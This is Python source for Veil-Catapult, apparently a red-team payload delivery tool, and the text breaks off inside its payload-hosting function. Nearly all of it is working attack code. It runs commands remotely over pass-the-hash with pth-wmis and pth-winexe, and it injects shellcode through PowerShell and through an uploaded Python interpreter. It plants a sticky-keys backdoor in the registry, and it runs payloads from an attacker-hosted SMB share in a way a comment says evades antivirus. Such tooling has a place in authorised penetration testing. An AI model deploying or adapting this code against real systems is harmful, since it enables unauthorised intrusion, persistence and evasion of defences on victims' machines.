#!/usr/bin/python

"""

Veil-Catapult 1.1
By: @harmj0y

Payload delivery tool and a part of the [Veil-Framework](www.veil-framework.com).

"""

import argparse, sys, re, os, threading, signal, readline, commands
import subprocess, time, base64, datetime, ConfigParser

veil_evasion_installed = True

# check for the Impacket installation
try:
    from impacket import smbserver
    from impacket.smbconnection import *
except ImportError:
    print "\n"
    print "\n [!] Impacket not installed"
    print "\n [*] Executing ./setup.sh"
    time.sleep(2)
    os.system('./setup.sh')
    time.sleep(2)

# check for passing-the-hash (pth-wmis/pth-winexe)
out = commands.getoutput("pth-wmis")
if "not found" in out:
    print "\n"
    print "\n [!] passing-the-hash not installed"
    print '\n [*] Executing ./setup.sh'
    time.sleep(2)
    os.system('./setup.sh')
    time.sleep(2)


# try to find and import the Veil-Framework master settings.py config file
if os.path.exists("/etc/veil/settings.py"):
    try:
        sys.path.append("/etc/veil/")
        import settings

        # append this so we can do relative imports of packages
        try:
            sys.path.append(settings.VEIL_EVASION_PATH)
        except AttributeError:
            print "\n [*] Executing ./setup.sh"
            os.system('./setup.sh')

        # Veil-Evasion imports
        from modules.common import controller
        from modules.common import supportfiles
        from modules.common import helpers
        from modules.common import completers
        from modules.common import shellcode
        from modules.payloads.powershell.shellcode_inject import virtual

    # set a flag if Veil-Evasion isn't installed
    except ImportError:
        veil_evasion_installed = False

else:
    # if the settings file isn't found, try to run the update script

    # mark that Veil-Evasion isn't installed so we can disable
    # linked functionality later
    veil_evasion_installed = False
    
    os.system('clear')
    print '========================================================================='
    print ' Veil First Run Detected... Initializing Script Setup...'
    print '========================================================================='
    time.sleep(2)

    # run the config if it hasn't been run
    print '\n [*] Executing ./setup.sh...'
    os.system('./setup.sh')
    time.sleep(2)

    # check for the config again and error out if it can't be found.
    if os.path.exists("/etc/veil/settings.py"):
        try:
            sys.path.append("/etc/veil/")
            import settings

            # Veil-Evasion imports
            sys.path.append(settings.VEIL_EVASION_PATH)
            print "PATH:",settings.VEIL_EVASION_PATH
            from modules.common import controller
            from modules.common import supportfiles
            from modules.common import helpers
            from modules.common import completers
            from modules.common import shellcode
            from modules.payloads.powershell.shellcode_inject import virtual

            veil_evasion_installed = True

        # Veil-Evasion not installed, screw it
        except ImportError as e: 
            print "error:",e


class ThreadedSMBServer(threading.Thread):
    """
    Threaded SMB server that can be spun up locally.

    Hosts the files in /tmp/shared/
    """

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','SERVICE')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file','/tmp/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share, /tmp/shared/, as HOST\SYSTEM\
        smbConfig.add_section("SYSTEM")
        smbConfig.set("SYSTEM",'comment','system share')
        smbConfig.set("SYSTEM",'read only','yes')
        smbConfig.set("SYSTEM",'share type','0')
        smbConfig.set("SYSTEM",'path',"/tmp/shared/")

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)

        print ' [*] setting up SMB server...'
        self.smb.processConfigFile()
        try:
            self.smb.serve_forever()
        except:
            pass

    def shutdown(self):
        print '\n [*] killing SMB server...'
        self.smb.shutdown()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()


####################################################################################
#
# Command helpers
#
####################################################################################

def runCommand(cmd):
    """
    run a system command locally and return the output
    """
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    return p.communicate()[0]


def wmisCommand(host, user, password, cmd):
    """
    use wmis to execute a specific command on a host with the specified creds
    utilizes pth-wmis -> "apt-get install passing-the-hash" is required
    """
    wmisCMD = "pth-wmis -U '%s%%%s' //%s '%s'"%(user, password, host, cmd)
    return runCommand(wmisCMD)


def winexeCommand(host, user, password, cmd, exe=False, singleCMD=False):
    """
    use pth-winexe to execute a specific command on a host with the specified creds
        "apt-get install passing-the-hash" is required
    """
    
    winexeCMD = ""

    if singleCMD:
        winexeCMD = "pth-winexe -U '%s%%%s' --system --uninstall //%s 'cmd.exe /C %s'"%(user, password, host, cmd)
    else:
        # .exe's are launched with the /B background command, other commands without
        if exe:
            winexeCMD = "pth-winexe -U '%s%%%s' --system --uninstall //%s 'cmd.exe /C start /B %s'"%(user, password, host, cmd)
        else:
            winexeCMD = "pth-winexe -U '%s%%%s' --system --uninstall //%s 'cmd.exe /C start %s'"%(user, password, host, cmd)
 
    return runCommand(winexeCMD)


def color(string, status=True, warning=False, bold=True):
    """
    Change text color for the linux terminal, defaults to green.
    
    Set "warning=True" for red.
    """
    attr = []
    if status:
        # green
        attr.append('32')
    if warning:
        # red
        attr.append('31')
    if bold:
        attr.append('1')
    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)


####################################################################################
#
# Menus
#
####################################################################################

def title():
    """
    Print the tool title, with version.
    """
    os.system('clear')
    print "========================================================================="
    print " Veil-Catapult: payload delivery system | [Version]: 1.1"
    print '========================================================================='
    print ' [Web]: https://www.veil-framework.com/ | [Twitter]: @veilframework'
    print '========================================================================='
    print ""

    # print a warning if Veil-Evasion is not installed
    if not veil_evasion_installed:
        print color(" [!] Warning: install Veil-Evasion for full functionality\n", warning=True)

    if settings.OPERATING_SYSTEM != "Kali":
        print color("\n[!] Warning: only x86 Kali linux is currently supported", warning=True)
        print color("[!] Continue at your own risk!\n", warning=True)
    
    # check to make sure the current OS is supported,
    # print a warning message if it's not and exit
    if settings.OPERATING_SYSTEM == "Windows" or settings.OPERATING_SYSTEM == "Unsupported":
        print color("\n[!] ERROR: your operating system is not current supported\n", warning=True)
        sys.exit()


def mainMenu(args):
    """
    Main/initial interaction menu.
    """

    commands = [ ("1)", "Standalone payloads"),
                 ("2)" , "EXE delivery"),
                 ("3)" , "Cleanup"),
                 ("4)" , "Exit") ]

    choice = ""
    while choice == "":

        title()
        print " Main Menu\n"
        print " Available options:\n"

        for (cmd, desc) in commands:
            print "\t%s\t%s" % ('{0: <4}'.format(cmd), desc)

        choice = raw_input("\n [>] Please enter a choice: ")

        if choice == "1":
            standaloneMenu(args)  
        elif choice == "2":
            exeDeliveryMenu(args)
        elif choice == "3":
            cleanupMenu()
        elif choice == "4":
            raise KeyboardInterrupt
        else:
            choice = ""


def standaloneMenu(args):
    """
    Menu to handle the selection of a standalone/non-exe payloads.
    """

    commands = [ ("1)" , "Powershell injector"),
                 ("2)" , "Barebones python injector"),
                 ("3)" , "Sethc backdoor"),
                 ("4)" , "Execute custom command"),
                 ("5)" , "Back") ]

    choice = ""
    while choice == "":

        title()
        print " Standalone payloads\n"
        print " Available options:\n"

        for (cmd, desc) in commands:
            print "\t%s\t%s" % ('{0: <4}'.format(cmd), desc)

        choice = raw_input("\n [>] Please enter a choice: ")

        if choice == "1":
            powershellMenu(args)  
        elif choice == "2":
            pythonMenu(args)
        elif choice == "3":
            sethcBackdoorMenu(args)
        elif choice == "4":
            customCommandMenu(args)
        elif choice == "5":
            mainMenu(args)
        else:
            choice = ""


def invokeMethodMenu(args):
    """
    Short menu that allows for choosing the invocation method.

    Right now just pth-wmis and pth-winexe.
    """

    if args.wmis:
        return "wmis"
    elif args.winexe:
        return "winexe"
    else:
        choice = raw_input(" [>] Use pth-[wmis] (default) or pth-[winexe]? ")

        if "winexe" in choice.lower():
            return "winexe"
        else:
            return "wmis"


def targetMenu(args):
    """
    Menu for choosing target and username/creds options.
    Used by various other methods/menus.

    Returns: (targets, creds)
    """

    targets = []
    creds = ["",""]

    # grab target/target list information if we didn't get anything passed
    # on the command line by argument
    if not args.tL and not args.t: 
        choice = ""

        while choice == "":

            try:
                comp = completers.PathCompleter()
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(comp.complete)
            except NameError: pass

            choice = raw_input(" [>] Enter a target IP or target list: ")

            if choice == "": continue # if nothing is specified, loop
            # if we want to exit this menu with 'back', return an empty options
            if choice.lower() == "back": return None
            # check if the host given is an IP (otherwise assume it's a target list
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', choice):
                targets.append(choice)
            else:
                try:
                    t = open(choice).readlines()
                    t = [x.strip() for x in t if x.strip() != ""]
                    targets += t
                # likely a file that doesn't exist or something
                except:
                    print color(" [!] Error reading file: " + choice, warning=True)

    # set targets if we received command line arguments
    if args.t:
        targets.append(args.t)
    # target list
    if args.tL:
        try:
            t = open(args.tL).readlines()
            t = [x.strip() for x in t if x.strip() != ""]
            targets += t
        except: 
            print color(" [!] Error reading file: " + choice, warning=True)

    # if we got a hashdump style cred file passed
    if args.cF:
        if os.path.exists(args.cF):

            try:
                f = open(args.cF)
                line = f.readlines()[0].strip()
                f.close()
            except:
                print color(" [!] Error reading file: " + choice, warning=True)

            parts = [x for x in line.split(":") if x != ""]
            if len(parts) == 4:
                args.U = parts[0]
                args.P = parts[2] + ":" + parts[3]
            else:
                print color(" [!] Warning: invalid pwdump file passed as an argument", warning=True)
        else:
            print color(" [!] Warning: file %s does not exist" %(args.cF), warning=True)

    # make sure we have a username and password/hash
    if not args.U:
        choice = ""
        while choice == "":
            choice = raw_input(" [>] Enter a [domain/]username or credump file: ")

            if choice == "": continue # if nothing is specified, loop

            if os.path.exists(choice):

                f = open(choice)
                line = f.readlines()[0].strip()
                f.close()

                parts = [x for x in line.split(":") if x != ""]
                if len(parts) == 4:
                    args.U = parts[0]
                    args.P = parts[2] + ":" + parts[3]
                else:
                    print color(" [!] Warning: invalid pwdump file", warning=True)
                    continue
            else:
                # if it's not a file, assume it's a user
                creds[0] = choice
    else:
        creds[0] = args.U

    if not args.P:
        choice = ""
        while choice == "":
            choice = raw_input(" [>] Enter a password or LM:NTLM hash: ")
            if choice == "": continue # if nothing is specified, loop
            creds[1] = choice
    else:
        creds[1] = args.P

    return (targets, creds)


def exeDeliveryMenu(args):
    """
    Menu for EXE delivery.

    Will take a path to a custom .exe or invoke Veil-Evasion.
    """

    title()
    print " EXE delivery\n"

    payloadPath = ""

    # if we're using a custom payload, set it
    if args.exe:
        payloadPath = args.exe

    # otherwise, ask for user input
    else:

        choice = ""

        # if no payload specified on the command line, prompt the user
        if not args.p:
            try:
                comp = completers.PathCompleter()
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(comp.complete)
            except NameError: pass
            
            choice = raw_input(" [>] Enter EXE path, or [enter] to use Veil-Evasion: ")

        if choice != "":
            payloadPath = choice

        else:
            # print a warning and exit if Veil-Evasion is not installed
            if not veil_evasion_installed:
                print color("\n [!] Warning: Veil-Evasion required for this functionality", warning=True)
                print color(" [!] see https://github.com/Veil-Framework/\n", warning=True)
                sys.exit()
                
            # instantiate the main Veil-Evasion controller object so we can use its menus
            con = controller.Controller()

            options = {}
            if args.p:
                if args.msfpayload:
                    options['msfpayload'] = [args.msfpayload, args.msfoptions]

                if args.c:
                    options['required_options'] = {}
                    for option in args.c:
                        name,value = option.split("=")
                        options['required_options'][name] = [value, ""]

                con.SetPayload(args.p, options)

                code = con.GeneratePayload()
                payloadPath = con.OutputMenu(con.payload, code, showTitle=False, interactive=False, OutputBaseChoice="process")

            # if we're using the full interactive menu for Veil-Evasion
            else:
                payloadPath = con.MainMenu()

                # if we see the setting to spawn the handler for this payload
                if settings.SPAWN_CATAPULT_HANDLER.lower() == "true":

                    # build the path to what the handler should be and
                    handlerPath = settings.HANDLER_PATH + payloadPath.split(".")[0].split("/")[-1] + "_handler.rc"

                    cmd = "gnome-terminal --tab -t \"Veil-Evasion Handler\" -x bash -c \"echo ' [*] Spawning Metasploit handler...' && msfconsole -r '" + handlerPath + "'\""
                    
                    # invoke msfconsole with the handler script in a new tab
                    os.system(cmd)

                if payloadPath == "":
                    mainMenu(args)
                title()

                print " EXE delivery\n"

    # get the targets and credentials
    (targets, creds) = targetMenu(args)
    username, password = creds[0], creds[1]

    # get the invoke method, wmis or winexe
    triggerMethod = invokeMethodMenu(args)

    # check if we got the trigger method passed by command line
    choice = args.act
    if not choice:
        title()
        print " EXE delivery\n"
        print " [>] Would you like to [h]ost the .exe or [u]pload it (default)? "

        choice = raw_input(color(" [>] Warning: python payloads MUST be uploaded! : ", warning=True))

    if choice == "" or choice.lower().strip()[0] == "u":

        # prompt for triggering unless specified not to
        if not args.nc:
            raw_input("\n [>] Press enter to launch: ")

        # actually do the upload and triggering of the payload
        uploadTrigger(payloadPath, triggerMethod, targets, username, password)

    else:
        # if we're hosting the payload and psexec'ing the remote network path
        localHost = ""
        if args.lip:
            localHost = args.lip
        while localHost == "":

            try:
                comp = completers.IPCompleter()
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(comp.complete)
            except NameError: pass

            localHost = raw_input("\n [>] Please enter local IP, [tab] for eth0: ")
            if localHost == "": continue # if nothing is specified, loop

        # prompt for triggering unless specified not to
        if not args.nc:
            raw_input("\n [>] Press enter to launch: ")
        hostTrigger(payloadPath, triggerMethod, targets, username, password, localHost)


def cleanupMenu():
    """
    Menu for running a cleanup script.
    """

    title()
    print " Cleanup\n"

    try:
        comp = completers.PathCompleter()
        readline.set_completer_delims(' \t\n;')
        readline.parse_and_bind("tab: complete")
        readline.set_completer(comp.complete)
    except NameError: pass

    script = ""

    while script == "":
        script = raw_input(" [>] Please enter a cleanup .rc script: ")
        if script == "": continue

    cleanup(script)


###############################################################
#
# Self-contained payload menus
#
###############################################################

def powershellMenu(args):
    """
    Builds a powershell injector payload and then delivers it 
    with pth-wmis or pth-winexe.
    """

    title()
    print color(" Powershell shellcode injector\n")

    # print a warning and exit if Veil-Evasion is not installed
    if not veil_evasion_installed:
        print color(" [!] Warning: Veil-Evasion required for this functionality", warning=True)
        print color(" [!] see https://github.com/Veil-Framework/\n", warning=True)
        sys.exit()

    # get the targets and credentials
    (targets, creds) = targetMenu(args)
    username, password = creds[0], creds[1]

    # get the invoke method, wmis or winexe
    triggerMethod = invokeMethodMenu(args)

    p = virtual.Payload()

    # pull out any msfpayload payloads/options
    if args.msfpayload:
        p.shellcode.SetPayload([args.msfpayload, args.msfoptions])

    # set custom shellcode if specified
    elif args.custshell:
        p.shellcode.setCustomShellcode(args.custshell)

    # generate the powershell payload
    code = p.generate()

    title()
    print color(" Powershell shellcode injector\n")

    # prompt for triggering unless specified not to
    if not args.nc:
        raw_input(" [>] Press enter to launch: ")
    print ""

    # for each target, execute the powershell command using the invocation method
    for target in targets:
        print " [*] Triggering powershell injector on %s" %(target)

        if triggerMethod == "wmis":
            out = wmisCommand(target, username, password, "cmd.exe /c " + code)
        else:
            out = winexeCommand(target, username, password, code)

        # make sure the wmis/winexe command was successful as best we can
        if out:
            if triggerMethod == "wmis":
                if "Success" not in out:
                    if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                        print color(" [!] Host "+target+" unreachable", warning="True")
                    elif "NT_STATUS_CONNECTION_REFUSED" in out:
                        print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                    elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                        print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                    else:
                        print color(" [!] Misc error on "+target, warning="True")
            else:
                if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                    print color(" [!] Host "+target+" unreachable", warning="True")
                elif "NT_STATUS_CONNECTION_REFUSED" in out:
                    print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                    print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")

    print color("\n [*] Powershell delivery complete!\n")


def pythonMenu(args):
    """
    Uploads a python bare installation in a zip, along with an trusted "7za.exe"

    Then issues two pth-wmis/pth-winexe commands: one to unzip the python install,
    and a second to invoke the python interpreter with a command line script specification.
    End result: only trusted binaries hit disk, no services are created,
    and whatever shellcode you want is injected : )

    Concept originally found at http://r00tsec.blogspot.com/2011/10/python-one-line-shellcode.html 
    """

    title()
    print color(" Python barebones shellcode injector\n")

    # print a warning and exit if Veil-Evasion is not installed
    if not veil_evasion_installed:
        print color(" [!] Warning: Veil-Evasion required for this functionality", warning=True)
        print color(" [!] see https://github.com/Veil-Framework/\n", warning=True)
        sys.exit()

     # get the targets and credentials
    (targets, creds) = targetMenu(args)
    username, password = creds[0], creds[1]

    smb_domain, smb_username = "", ""

    # if username = domain/username, extract the domain
    # used for smb,.login()
    if len(username.split("/")) == 2:
        smb_domain, smb_username = username.split("/")
    else:
        # if no domain, keep the username the same
        smb_username = username

    # get the invoke method, wmis or winexe
    triggerMethod = invokeMethodMenu(args)

    # nab up some shellcode
    sc = shellcode.Shellcode()

    # set the payload to use, if specified
    if args.msfpayload:
        sc.SetPayload([args.msfpayload, args.msfoptions])

    # set custom shellcode if specified
    elif args.custshell:
        sc.setCustomShellcode(args.custshell)

    # base64 our shellcode
    b64sc = base64.b64encode(sc.generate().decode("string_escape"))

    title()
    print color(" Python barebones shellcode injector\n")

    # prompt for triggering unless specified not to
    if not args.nc:
        raw_input(" [>] Press enter to launch: ")

    for target in targets:

        print ""
        # try to login to the target over SMB
        try:
            smb = SMBConnection('*SMBSERVER', target, timeout=3)
            if re.match(r'[0-9A-Za-z]{32}:[0-9A-Za-z]{32}', password):
                lm,nt = password.split(":")
                smb.login(smb_username, None, lmhash=lm, nthash=nt, domain=smb_domain)
            else:
                smb.login(smb_username, password, domain=smb_domain)

        # error handling
        except Exception as e:
            if "timed out" in str(e).lower():
                print color(" [!] Target %s not reachable" %(target), warning=True)
            elif "connection refused" in str(e).lower():
                print color(" [!] Target %s reachable but connection refused" %(target), warning=True)
            elif "STATUS_LOGON_FAILURE" in str(e):
                print color(" [!] SMB logon failure on %s (likely bad credentials)" %(target), warning=True)
            else:
                print color(" [!] Misc error logging into %s" %(target), warning=True)
            continue # skip to the next target

        try:
            # reset the default timeout
            #socket.setdefaulttimeout(defaultTimeout)

            # upload the bare bones python install to
            f = open("./includes/python.zip")
            smb.putFile("ADMIN$", "\\Temp\\python.zip", f.read)
            f.close()

            # upload the trusted 7za program
            f = open("./includes/7za.exe")
            smb.putFile("ADMIN$", "\\Temp\\7za.exe", f.read)
            f.close()
            print color(" [*] python install successfully uploaded to " + target)

            # close out the smb connection
            smb.logoff()

        except Exception as e:
            #print " Exception:",e
            if "The NETBIOS connection with the remote host timed out" in str(e):
                print color(" [!] The NETBIOS connection with %s timed out" %(target), warning=True)
            else:
                print color(" [!] SMB file upload unsuccessful on %s" %(target), warning=True)
            continue

        # the command to unzip the python environment
        unzipCommand = "C:\\\\Windows\\\\Temp\\\\7za.exe x -y -oC:\\\\Windows\\\\Temp\\\\ C:\\\\Windows\\\\Temp\\\\python.zip"

        # our python 1-liner shellcode injection command
        pythonCMD = "C:\\\\Windows\\\\Temp\\\\python\\\\python.exe -c \"from ctypes import *;a=\\\"%s\\\".decode(\\\"base_64\\\");cast(create_string_buffer(a,len(a)),CFUNCTYPE(c_void_p))()\"" %(b64sc)

        time.sleep(1)

        if triggerMethod == "wmis":
            out = wmisCommand(target, username, password, "cmd.exe /c " + unzipCommand)
        else:
            out = winexeCommand(target, username, password, unzipCommand)

        # make sure the wmis/winexe command was successful as best we can
        success = True
        if out:
            if triggerMethod == "wmis":
                if "Success" not in out:
                    success = False
                    if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                        print color(" [!] Host "+target+" unreachable", warning="True")
                    elif "NT_STATUS_CONNECTION_REFUSED" in out:
                        print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                    elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                        print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                    else:
                        print color(" [!] Misc error on "+target, warning="True")
            else:
                if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                    success = False
                    print color(" [!] Host "+target+" unreachable", warning="True")
                elif "NT_STATUS_CONNECTION_REFUSED" in out:
                    success = False
                    print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                    success = False
                    print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")

        # if the unzip command is successful, continue to the second command for invocation
        if success:

            time.sleep(2)
            if triggerMethod == "wmis":
                out = wmisCommand(target, username, password, "cmd.exe /c " + pythonCMD)
            else:
                out = winexeCommand(target, username, password, pythonCMD)

            # make sure the wmis/winexe command was successful as best we can
            if out:
                if triggerMethod == "wmis":
                    if "Success" not in out:
                        if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                            print color(" [!] Host "+target+" unreachable", warning="True")
                        elif "NT_STATUS_CONNECTION_REFUSED" in out:
                            print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                        elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                            print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                        else:
                            print color(" [!] Misc error on "+target, warning="True")
                    else:
                         print color(" [*] python injector triggered on " + target)
                else:
                    if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                        print color(" [!] Host "+target+" unreachable", warning="True")
                    elif "NT_STATUS_CONNECTION_REFUSED" in out:
                        print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                    elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                        print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                    else:
                        print color(" [*] python injector triggered on " + target)
    
    print color("\n [*] Python injection complete!\n")


def sethcBackdoorMenu(args):
    """
    Sets up a sticky-keys backdoor on a specified host using a single
    reg query through pth-wmis/pth-winexe
    """

    title()
    print color(" Sethc.exe sticky-keys backdoor\n")

    cleanup = ""

    # get the targets and credentials
    (targets, creds) = targetMenu(args)
    username, password = creds[0], creds[1]

    # get the invoke method, wmis or winexe
    triggerMethod = invokeMethodMenu(args)

    # prompt for triggering unless specified not to
    if not args.nc:
        raw_input(" [>] Press enter to launch: ")

    title()
    print color(" Sethc.exe sticky-keys backdoor\n")

    # the registry command to set up the sethc stickkeys backdoor
    sethcCommand = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\""

    # for each target, execute the sethc.exe reg command using the invocation method
    for target in targets:
        print ""
        print color(" [*] Installing sethc backdoor on %s" %(target))

        if triggerMethod == "wmis":
            out = wmisCommand(target, username, password, "cmd.exe /c " + sethcCommand)
        else:
            out = winexeCommand(target, username, password, sethcCommand)

        # make sure the wmis/winexe command was successful as best we can
        if out:
            if triggerMethod == "wmis":
                if "Success" not in out:
                    if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                        print color(" [!] Host "+target+" unreachable", warning="True")
                    elif "NT_STATUS_CONNECTION_REFUSED" in out:
                        print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                    elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                        print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                    else:
                        print color(" [!] Misc error on "+target, warning="True")
                else:
                    cleanup += target + " " + creds[0] + " " + creds[1] + " SETHC wmis\n"
            else:
                if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                    print color(" [!] Host "+target+" unreachable", warning="True")
                elif "NT_STATUS_CONNECTION_REFUSED" in out:
                    print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                    print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                else:
                    cleanup += target + " " + creds[0] + " " + creds[1] + " SETHC winexe\n"

    # only write out our cleanup script if there were some results
    if cleanup != "":
        cleanupFileNameBase =  datetime.datetime.fromtimestamp(time.time()).strftime('%m.%d.%Y.%H%M%S') + ".rc"
        cleanupFileName = os.path.join(settings.CATAPULT_RESOURCE_PATH, cleanupFileNameBase)
        cleanupFile = open(cleanupFileName, 'w')
        cleanupFile.write(cleanup)
        cleanupFile.close()

        print "\n [*] Cleanup script written to " + cleanupFileNameBase
        print " [*] run with \"./Veil-Catapult.py -r " + cleanupFileName + "\"\n"

    print color("\n [*] Sethc backdoor injection complete!\n")


def customCommandMenu(args):
    """
    Executes a custom pth-wmis or pth-winexe command.
    """

    title()
    print color(" Custom command execution\n")

    # get the targets and credentials
    (targets, creds) = targetMenu(args)
    username, password = creds[0], creds[1]

    # get the invoke method, wmis or winexe
    triggerMethod = invokeMethodMenu(args)

    cmdChoice = ""
    while cmdChoice == "":
        cmdChoice = raw_input(" [>] Enter a command to execute: ")

    # prompt for triggering unless specified not to
    if not args.nc:
        raw_input("\n [>] Press enter to launch: ")

    title()
    print color(" Custom command execution\n")

    # for each target, execute the powershell command using the invocation method
    for target in targets:
        print ""
        print color(" [*] Executing command on %s" %(target))

        if triggerMethod == "wmis":
            out = wmisCommand(target, username, password, "cmd.exe /c " + cmdChoice)
        else:
            out = winexeCommand(target, username, password, cmdChoice, singleCMD=True)

        # make sure the wmis/winexe command was successful as best we can
        if out:
            if triggerMethod == "wmis":
                if "Success" not in out:
                    if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                        print color(" [!] Host "+target+" unreachable", warning="True")
                    elif "NT_STATUS_CONNECTION_REFUSED" in out:
                        print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                    elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                        print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                    else:
                        print color(" [!] Misc error on "+target, warning="True")
            else:
                if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                    print color(" [!] Host "+target+" unreachable", warning="True")
                elif "NT_STATUS_CONNECTION_REFUSED" in out:
                    print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                    print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")

    print color("\n [*] Custom command execution complete!\n")


###############################################################
#
# EXE delivery methods
#
###############################################################

def hostTrigger(payloadPath, triggerMethod, targets, username, password, localHost):
    """
    Spins up an Impacket SMB server and hosts the compiled payload .exe.
    WMIS or WINEXE is then used on each target with the remote share as the
    process to execute, invoking the .exe purely in memory. 
    Note: this evades several AV vendors, even with normally detectable
    executables. #avlol : )

    payloadPath = the local path to the .exe to upload
    targets = a list of targets
    username = the username to use
    password = the password/hash to use
    script = the cleanup script to write to
    localHost = the local IP to host the SMB server on
    """
    title()

    hashes = None
    cleanup = ""

    hostedFileName = helpers.randomString(length=8) + ".exe"

    # make the tmp hosting directory if it doesn't already exist
    if not os.path.exists("/tmp/shared/"): os.makedirs("/tmp/shared/")

    # copy the payload to the randomname in the temp directory
    os.system("cp %s /tmp/shared/%s" % (payloadPath, hostedFileName) )

    # start up the server
    server = ThreadedSMBServer()
    server.start()
    time.sleep(1)

    # check if the supplied cred is a LM:NTLM hash
    if re.match(r'[0-9A-Za-z]{32}:[0-9A-Za-z]{32}', password):
        hashes = password

    # upload and trigger the payload for each target 
    for target in targets:
        
        try:
            success = True
            # our command will invoke the payload from a network path back to us
            cmd = "\\\\" + localHost + "\\system\\" + hostedFileName

            # trigger the payload using impacket's psexec for our particular command
            print "\n [*] Triggering payload on %s" %(target)

            if triggerMethod == "wmis":
                out = wmisCommand(target, username, password, cmd)
            else:
                out = winexeCommand(target, username, password, cmd, exe=True)

            # make sure the wmis/winexe command was successful as best we can
            if out:
                if triggerMethod == "wmis":
                    if "Success" not in out:
                        if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                            print color(" [!] Host "+target+" unreachable", warning="True")
                            success = False
                        elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                            print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                            success = False
                        else:
                            print color(" [!] Error on "+target+": "+out, warning="True")
                            success = False
                else:
                    if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                        print color(" [!] Host "+target+" unreachable", warning="True")
                        success = False
                    if "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                        print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                        success = False

            if success:
                # if the command was successful,
                # update the cleanup script: "host username password HOST_TRIGGER processname wmis/winexe"
                if triggerMethod == "wmis":
                    cleanup += target + " " + username + " " + password + " HOST_TRIGGER wmis " + hostedFileName + "\n"
                else:
                    cleanup += target + " " + username + " " + password + " HOST_TRIGGER winexe " + hostedFileName + "\n"

        except Exception as e:
            print "Exception:",e
            print color(" [!] Error on "+str(target)+" with credentials "+str(username)+":"+str(password), warning="True")


    print color("\n [*] Giving time for commands to trigger...")
